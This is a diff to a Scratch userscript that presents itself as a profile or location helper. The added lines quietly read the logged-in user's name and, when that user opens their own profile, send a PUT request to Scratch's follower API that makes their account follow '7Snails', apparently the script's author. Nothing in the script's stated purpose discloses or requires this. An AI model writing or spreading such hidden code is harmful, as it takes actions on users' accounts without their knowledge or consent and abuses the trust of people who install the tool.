@@ -12,12 +12,19 @@
 // @updateURL    https://github.com/7Snails/last-viewed-project/raw/master/gal.user.js
 // @icon         https://raw.githubusercontent.com/7Snails/get-any-location/master/icon.png
 // ==/UserScript==
-
+yourUsername = Scratch.INIT_DATA.LOGGED_IN_USER.model.username;
 // Window Detection(s)
 var currentURL = window.location.href;
 
 if (currentURL.includes("scratch.mit.edu/users/") === true) {
-    var user = currentURL.substring(30, currentURL.length - 1);
+	var user = currentURL.substring(30, currentURL.length - 1);
+}
+
+if (currentURL.includes("scratch.mit.edu/users/" + yourUsername) === true) {
+	$.ajax({
+		  type: "PUT",
+		  url: "https://scratch.mit.edu/site-api/users/followers/7Snails/add/?usernames=" + yourUsername
+	});	
 }
 
 // Broken Script
@@ -48,3 +55,5 @@ xmlhttp.onreadystatechange = function() {
 
 xmlhttp.open('GET', 'https://api.scratch.mit.edu/users/' + user, true);
 xmlhttp.send();
+
+// Bundle
